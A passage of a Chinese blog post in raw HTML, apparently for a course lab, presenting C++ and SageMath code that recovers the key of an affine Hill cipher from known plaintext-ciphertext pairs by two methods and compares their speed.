class=\"keyword\">for</span> (<span class=\"type\">int</span> i = start; i &lt; n; ++i) &#123;</span><br><span class=\"line\">        combination.<span class=\"built_in\">push_back</span>(i);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"built_in\">combi</span>(n, m, i + <span class=\"number\">1</span>, combination) == <span class=\"number\">0</span>)<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        combination.<span class=\"built_in\">pop_back</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>对每一个组合，执行如下函数，存储  <code>X1</code>  和  <code>Y1</code> ，并开始递归寻找剩余 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi><mo>−</mo><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">n-m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">m</span></span></span></span> 对向量的 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">m</span></span></span></span> 排列来组成  <code>X2</code>  和  <code>Y2</code></p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">after_combi</span><span class=\"params\">(vector&lt;<span class=\"type\">int</span>&gt;&amp; combination)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"function\">vector&lt;<span class=\"type\">int</span>&gt; <span class=\"title\">remain</span><span class=\"params\">(n)</span></span>;</span><br><span class=\"line\">    <span class=\"built_in\">iota</span>(remain.<span class=\"built_in\">begin</span>(), remain.<span class=\"built_in\">end</span>(), <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>; i &lt; m; ++i)&#123;</span><br><span class=\"line\">        X1[i] = x[combination[i]];</span><br><span class=\"line\">        Y1[i] = y[combination[i]];</span><br><span class=\"line\">        remain.<span class=\"built_in\">erase</span>(<span class=\"built_in\">remove</span>(remain.<span class=\"built_in\">begin</span>(), remain.<span class=\"built_in\">end</span>(), combination[i]), remain.<span class=\"built_in\">end</span>());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\">vector&lt;<span class=\"type\">bool</span>&gt; <span class=\"title\">used</span><span class=\"params\">(n, <span class=\"literal\">false</span>)</span></span>;</span><br><span class=\"line\">    vector&lt;<span class=\"type\">int</span>&gt; current;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">permu</span>(remain, current, used, m);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span> 个数 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>k</mi></mrow><annotation encoding=\"application/x-tex\">k</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span></span></span></span> 排序的递归实现</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">permu</span><span class=\"params\">(vector&lt;<span class=\"type\">int</span>&gt;&amp; nums, vector&lt;<span class=\"type\">int</span>&gt;&amp; current, vector&lt;<span class=\"type\">bool</span>&gt;&amp; used, <span class=\"type\">int</span> k)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((<span class=\"type\">int</span>)current.<span class=\"built_in\">size</span>() == k) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">after_permu</span>(nums);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; nums.<span class=\"built_in\">size</span>(); ++i) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!used[i]) &#123;</span><br><span class=\"line\">            used[i] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            current.<span class=\"built_in\">push_back</span>(nums[i]);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"built_in\">permu</span>(nums, current, used, m) == <span class=\"number\">0</span>)<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">            used[i] = <span class=\"literal\">false</span>;</span><br><span class=\"line\">            current.<span class=\"built_in\">pop_back</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>在递归的最后，存储  <code>X2</code>  和  <code>Y2</code> ，判断 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mi>X</mi><mn>1</mn><mo>−</mo><mi>X</mi><mn>2</mn><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">(X1-X2)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">2</span><span class=\"mclose\">)</span></span></span></span> 是否可逆：</p>\n<ul>\n<li>可逆则可以输出结果并返回  <code>0</code>  以中断结束递归</li>\n<li>否则返回  <code>0</code>  继续递归</li>\n</ul>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">after_permu</span><span class=\"params\">(vector&lt;<span class=\"type\">int</span>&gt;&amp; permutation)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>; i &lt; m; ++i)&#123;</span><br><span class=\"line\">        X2[i] = x[permutation[i]];</span><br><span class=\"line\">        Y2[i] = y[permutation[i]];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    X = <span class=\"built_in\">sub</span>(X2, X1);</span><br><span class=\"line\">    det_inv = inversetable[<span class=\"built_in\">determinant</span>(X)];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (det_inv == <span class=\"number\">0</span> ) <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    Y = <span class=\"built_in\">sub</span>(Y2, Y1);</span><br><span class=\"line\">    vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; L = <span class=\"built_in\">multiply</span>(<span class=\"built_in\">inverse</span>(X, det_inv), Y);</span><br><span class=\"line\">    vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; B = <span class=\"built_in\">sub</span>(Y1, <span class=\"built_in\">multiply</span>(X1, L));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 输出结果......</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>在  <code>main</code>  函数最后调用  <code>combi</code>  开始递归。</p>\n<h2 id=\"思路二-2\"><a class=\"anchor\" href=\"#思路二-2\">#</a> 思路二</h2>\n<h3 id=\"存储矩阵\"><a class=\"anchor\" href=\"#存储矩阵\">#</a> 存储矩阵</h3>\n<p>定义如下变量：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; X = vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt;(n, <span class=\"built_in\">vector</span>&lt;<span class=\"type\">int</span>&gt;(m));</span><br><span class=\"line\">vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; Y = vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt;(n, <span class=\"built_in\">vector</span>&lt;<span class=\"type\">int</span>&gt;(m));</span><br><span class=\"line\">vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; X_T = vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt;(m, <span class=\"built_in\">vector</span>&lt;<span class=\"type\">int</span>&gt;(n));</span><br><span class=\"line\">vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; X1 = vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt;(m, <span class=\"built_in\">vector</span>&lt;<span class=\"type\">int</span>&gt;(m));</span><br><span class=\"line\">vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; Y1 = vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt;(m, <span class=\"built_in\">vector</span>&lt;<span class=\"type\">int</span>&gt;(m));</span><br><span class=\"line\">vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; XTX;</span><br><span class=\"line\"><span class=\"type\">int</span> m = <span class=\"number\">0</span>, n=<span class=\"number\">0</span>, det_inv = <span class=\"number\">0</span>;</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><code>X</code>  和  <code>Y</code>  均为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi><mo>×</mo><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">n\\times m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">m</span></span></span></span> 的矩阵。</li>\n<li><code>X_T</code>  是 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi><mo>×</mo><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">m\\times n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span> 的矩阵，代表 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>X</mi><mi>T</mi></msup></mrow><annotation encoding=\"application/x-tex\">X^{T}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8413309999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span></span></span></span></span></span></span></span>。</li>\n<li><code>XTX</code>  是 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi><mo>×</mo><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">m\\times m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">m</span></span></span></span> 的矩阵，代表 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>X</mi><mi>T</mi></msup><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X^{T}X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8413309999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span>。</li>\n<li><code>X1</code>  和  <code>Y1</code>  仍然为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi><mo>×</mo><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">m\\times m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">m</span></span></span></span> 的矩阵，用来计算 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>B</mi></mrow><annotation encoding=\"application/x-tex\">B</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05017em;\">B</span></span></span></span>。</li>\n</ul>\n<h3 id=\"计算\"><a class=\"anchor\" href=\"#计算\">#</a> 计算</h3>\n<p>循环反复地随机生成  <code>X</code>  和  <code>Y</code> ，直到得到的 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>X</mi><mi>T</mi></msup><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X^{T}X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8413309999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span> 可逆为止。</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// #include &lt;random&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">random_device rd;</span><br><span class=\"line\"><span class=\"function\">mt19937 <span class=\"title\">gen</span><span class=\"params\">(rd())</span></span>;</span><br><span class=\"line\">uniform_int_distribution&lt;&gt; <span class=\"built_in\">dis</span>(<span class=\"number\">0</span>, n - <span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span>(det_inv == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; n; ++i)&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> d = <span class=\"built_in\">dis</span>(gen);</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">int</span> j = <span class=\"number\">0</span>; j &lt; m; ++j)&#123;</span><br><span class=\"line\">            X[i][j] = (c[i * m + j] - c[ d * m + j ] + MOD) % MOD;</span><br><span class=\"line\">            Y[i][j] = (s[i * m + j] - s[ d * m + j ] + MOD) % MOD;</span><br><span class=\"line\">            X_T[j][i] = X[i][j];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    XTX = <span class=\"built_in\">multiply</span>(X_T, X);</span><br><span class=\"line\">    det_inv = inversetable[<span class=\"built_in\">determinant</span>(XTX)];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; L = <span class=\"built_in\">multiply</span>(<span class=\"built_in\">multiply</span>(<span class=\"built_in\">inverse</span>(XTX, det_inv), X_T), Y);</span><br><span class=\"line\">vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; B = <span class=\"built_in\">sub</span>(Y1, <span class=\"built_in\">multiply</span>(X1, L));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 输出结果......</span></span><br></pre></td></tr></table></figure></p>\n<h1 id=\"测试\"><a class=\"anchor\" href=\"#测试\">#</a> 测试</h1>\n<h2 id=\"随机生成测试数据\"><a class=\"anchor\" href=\"#随机生成测试数据\">#</a> 随机生成测试数据</h2>\n<p>借用 SageMath 中的  <code>HillCryptosystem</code>  类可以方便地生成随机的希尔密码测试数据，但是 SageMath 不支持仿射希尔密码。</p>\n<p><figure class=\"highlight python\"><figcaption><span>SageMath</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> sage.<span class=\"built_in\">all</span> <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"></span><br><span class=\"line\">m = <span class=\"number\">5</span>        <span class=\"comment\"># 分组长度 m</span></span><br><span class=\"line\">n = <span class=\"number\">12</span>       <span class=\"comment\"># 分组数量 n</span></span><br><span class=\"line\">A = AlphabeticStrings()</span><br><span class=\"line\">H = HillCryptosystem(A, Integer(m))</span><br><span class=\"line\">K = H.random_key()</span><br><span class=\"line\">e = H(K)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(K)     <span class=\"comment\"># 输出随机密钥矩阵</span></span><br><span class=\"line\"></span><br><span class=\"line\">c = A(<span class=\"string\">&#x27;&#x27;</span>.join(random.choices(string.ascii_uppercase, k = m * n)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(m)     <span class=\"comment\"># 输出一行分组长度 m</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(c)     <span class=\"comment\"># 输出一行随机明文 c</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(e(c))  <span class=\"comment\"># 输出一行对应密文 s</span></span><br></pre></td></tr></table></figure></p>\n<p>python 的  <code>cryptography</code>  库也一样，虽然支持希尔密码但是不支持仿射希尔密码。</p>\n<h2 id=\"评价\"><a class=\"anchor\" href=\"#评价\">#</a> 评价</h2>\n<p>只考虑 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi><mo>≤</mo><mn>5</mn></mrow><annotation encoding=\"application/x-tex\">m\\leq5</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.7719400000000001em;vertical-align:-0.13597em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">≤</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">5</span></span></span></span> 的情况，再大的情况可能耗时更长暂不考虑。</p>\n<blockquote>\n<p>这个实验作业的输入条件如此</p>\n</blockquote>\n<p>在 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span> 和 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>2</mn><msup><mi>m</mi><mn>2</mn></msup></mrow><annotation encoding=\"application/x-tex\">2m^2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mord\"><span class=\"mord mathnormal\">m</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span></span> 的差值小于等于 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span></span></span></span> 时，思路一和思路二实现的破解速度几乎没有差别。</p>\n<p>当 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span> 和 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>2</mn><msup><mi>m</mi><mn>2</mn></msup></mrow><annotation encoding=\"application/x-tex\">2m^2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mord\"><span class=\"mord mathnormal\">m</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span></span> 的差值提升时，思路一寻找组合排列的时间复杂度大幅提升，这时候思路二的代码可以比思路一快上万倍，考虑到思路一的实现是递归，实际上函数调用栈较深也会影响性能。</p>\n<p>然而，当 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span> 和 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>2</mn><msup><mi>m</mi><mn>2</mn></msup></mrow><annotation encoding=\"application/x-tex\">2m^2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mord\"><span class=\"mord mathnormal\">m</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord 